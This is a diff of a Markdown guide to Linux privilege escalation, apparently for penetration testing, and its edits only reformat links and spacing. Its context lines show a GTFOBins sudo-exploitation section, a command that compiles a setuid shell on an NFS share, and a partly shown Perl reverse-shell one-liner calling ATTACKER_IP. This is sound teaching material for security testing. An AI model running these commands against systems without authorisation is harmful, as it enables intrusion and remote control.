@@ -214,7 +214,7 @@ sudo -l
 ```
 
 #### GTFOBins Sudo Exploitation
-Reference https://gtfobins.github.io for exploitation commands:
+Reference <https://gtfobins.github.io> for exploitation commands:
 
 ```bash
 # Example: vim with sudo
@@ -393,6 +393,7 @@ gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell
 ## Quick Reference
 
 ### Enumeration Commands Summary
+
 | Purpose | Command |
 |---------|---------|
 | Kernel version | `uname -a` |
@@ -420,9 +421,9 @@ perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpro
 ```
 
 ### Key Resources
-- GTFOBins: https://gtfobins.github.io
-- LinPEAS: https://github.com/carlospolop/PEASS-ng
-- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
+- GTFOBins: <https://gtfobins.github.io>
+- LinPEAS: <https://github.com/carlospolop/PEASS-ng>
+- Linux Exploit Suggester: <https://github.com/mzet-/linux-exploit-suggester>
 
 ## Constraints and Guardrails
 
